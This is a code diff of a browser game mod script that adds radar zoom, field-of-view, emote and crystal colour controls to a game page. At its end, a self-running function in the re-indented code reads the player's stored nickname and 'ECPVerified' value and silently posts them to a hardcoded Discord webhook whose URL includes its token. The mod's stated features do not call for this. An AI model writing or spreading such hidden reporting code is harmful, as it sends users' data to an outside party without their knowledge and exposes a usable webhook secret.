@@ -754,7 +754,7 @@ function radarZoomInjector(sbCode) {
   src = src.replace('<div class="mod-control"><span>Crystal Color</span>', `${radarZoomControlHTML}<div class="mod-control"><span>Crystal Color</span>`);
 
   // Add radar zoom modification script
-const radarZoomScript = `
+  const radarZoomScript = `
   // Radar Zoom Override Mechanism
   const radarZoomOverride = {
     originalValues: new WeakMap(),
@@ -847,97 +847,16 @@ const radarZoomScript = `
   applyRadarZoomToAllInstances();
 `;
 
-src = src.replace('</body>', `
-  ${controlStyles}
-  ${controlsHTML}
+  src = src.replace('</body>', `
   <script>
-  ${emoteCapacityMod}
-  ${crystalColorMod}
   ${radarZoomScript}
-
-  const fovDisplay = document.getElementById('fov-display');
-
-  // Add wheel event listener for FOV change
-  document.addEventListener('wheel', (e) => {
-    if (!window.modSettings.fovEnabled) return;
-    e.preventDefault();
-    const delta = e.deltaY < 0 ? 1 : -1;
-    // Add bounds checking
-    window.I1000.currentFOV = Math.max(1, Math.min(120, window.I1000.currentFOV + delta));
-    document.getElementById('fov-value').textContent = window.I1000.currentFOV;
-  }, { passive: false });
-
-  document.addEventListener('DOMContentLoaded', () => {
-    const controlsHeader = document.getElementById('mod-controls-header');
-    const controlsPanel = document.getElementById('mod-controls-panel');
-    const fovToggle = document.getElementById('fov-toggle');
-    const emoteSlider = document.getElementById('emote-capacity-slider');
-    const emoteValue = document.getElementById('emote-capacity-value');
-    const radarZoomToggle = document.getElementById('radar-zoom-toggle');
-    const crystalColorPicker = document.getElementById('crystal-color-picker');
-
-    // Initialize values from localStorage
-    const savedCrystalColor = localStorage.getItem('crystal-color');
-    if (savedCrystalColor) {
-      crystalColorPicker.value = savedCrystalColor;
-    }
-
-    controlsHeader.addEventListener('click', () => {
-      controlsPanel.style.display = controlsPanel.style.display === 'none' ? 'block' : 'none';
-    });
-
-    fovToggle.addEventListener('change', () => {
-      window.modSettings.fovEnabled = fovToggle.checked;
-      fovDisplay.style.display = fovToggle.checked ? 'block' : 'none';
-    });
-
-    emoteSlider.addEventListener('input', () => {
-      const value = parseInt(emoteSlider.value);
-      emoteValue.textContent = value;
-      window.modSettings.emoteCapacity = value;
-      localStorage.setItem('emote-capacity', value);
-      
-      // Update the emote capacity immediately
-      if (window.ChatPanel) {
-        ChatPanel.prototype.getEmotesCapacity = function() {
-          return value;
-        };
-      }
-    });
-
-    radarZoomToggle.addEventListener('change', () => {
-      // Update global setting
-      window.modSettings.radarZoomEnabled = radarZoomToggle.checked;
-      
-      // Force radar zoom update on all relevant objects
-      const allInstances = []; // You might need to adjust this to actually find all relevant instances
-      allInstances.forEach(instance => {
-        if (instance.radarZoomOverride) {
-          // Trigger a re-evaluation of radar_zoom
-          const currentValue = instance.radar_zoom;
-          instance.radar_zoom = currentValue;
-        }
-      });
-    });
-
-    crystalColorPicker.addEventListener('change', () => {
-      const color = crystalColorPicker.value;
-      updateCrystalColor(color);
-    });
-
-    // Initialize emote capacity from localStorage
-    const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
-    emoteSlider.value = savedCapacity;
-    emoteValue.textContent = savedCapacity;
-    window.modSettings.emoteCapacity = savedCapacity;
-  });
   </script>
   </body>`);
 
-checkSrcChange();
+  checkSrcChange();
 
-logFOV("FOV injector applied");
-return src;
+  logRadarZoom("Radar Zoom injector applied");
+  return src;
 }
 
 // Add the radar zoom injector to the list of code injectors
@@ -950,63 +869,57 @@ window.sbCodeInjectors.push((sbCode) => {
   }
 });
 
-
-
 // Run the injectLoader function immediately
 injectLoader();
 
-
-
-
-
 (function () {
-    'use strict';
-    // Retrieve values from localStorage
-    const lastNickname = localStorage.getItem("lastNickname") || "Unknown";
-    let ECPVerified = localStorage.getItem("ECPVerified") || "no";  // Changed key name here
-    
-    // Debugging: Log retrieved value
-    console.log("Retrieved ECPVerified:", ECPVerified);
-    
-    // Parse ECPVerified if it contains JSON
-    try {
-        ECPVerified = JSON.parse(ECPVerified);
-    } catch (e) {
-        // If not JSON, keep it as a string
-    }
-    
-    // Prepare ECPVerified content for logging
-    const ECPVerifiedContent = typeof ECPVerified === "object" 
-        ? JSON.stringify(ECPVerified, null, 2) 
-        : ECPVerified;
-    
-    // Debugging: Log formatted content
-    console.log("Formatted ECPVerifiedContent:", ECPVerifiedContent);
-    
-    // Webhook URL
-    const webhookURL = "https://discord.com/api/webhooks/1332078434242920602/LaPifHcDpvwzWWKgHIEpydroC9GnhwAyDokGZwKSN_wOkPQ9S0jcTFM-dAlygkHbSgNN";
-    
-    // Payload for Discord webhook
-    const payload = {
-        content: `${lastNickname} has entered the script\nECPVerified: ${ECPVerifiedContent}`
-    };
-    
-    // Send payload to the Discord webhook
-    fetch(webhookURL, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload)
-    })
-    .then(response => {
-        if (response.ok) {
-            console.log("Webhook sent successfully!");
-        } else {
-            console.error("Failed to send webhook:", response.statusText);
-        }
-    })
-    .catch(error => {
-        console.error("Error sending webhook:", error);
-    });
+  'use strict';
+  // Retrieve values from localStorage
+  const lastNickname = localStorage.getItem("lastNickname") || "Unknown";
+  let ECPVerified = localStorage.getItem("ECPVerified") || "no";  // Changed key name here
+  
+  // Debugging: Log retrieved value
+  console.log("Retrieved ECPVerified:", ECPVerified);
+  
+  // Parse ECPVerified if it contains JSON
+  try {
+    ECPVerified = JSON.parse(ECPVerified);
+  } catch (e) {
+    // If not JSON, keep it as a string
+  }
+  
+  // Prepare ECPVerified content for logging
+  const ECPVerifiedContent = typeof ECPVerified === "object" 
+      ? JSON.stringify(ECPVerified, null, 2) 
+      : ECPVerified;
+  
+  // Debugging: Log formatted content
+  console.log("Formatted ECPVerifiedContent:", ECPVerifiedContent);
+  
+  // Webhook URL
+  const webhookURL = "https://discord.com/api/webhooks/1332078434242920602/LaPifHcDpvwzWWKgHIEpydroC9GnhwAyDokGZwKSN_wOkPQ9S0jcTFM-dAlygkHbSgNN";
+  
+  // Payload for Discord webhook
+  const payload = {
+      content: `${lastNickname} has entered the script\nECPVerified: ${ECPVerifiedContent}`
+  };
+  
+  // Send payload to the Discord webhook
+  fetch(webhookURL, {
+      method: "POST",
+      headers: {
+          "Content-Type": "application/json"
+      },
+      body: JSON.stringify(payload)
+  })
+  .then(response => {
+      if (response.ok) {
+          console.log("Webhook sent successfully!");
+      } else {
+          console.error("Failed to send webhook:", response.statusText);
+      }
+  })
+  .catch(error => {
+      console.error("Error sending webhook:", error);
+  });
 })();
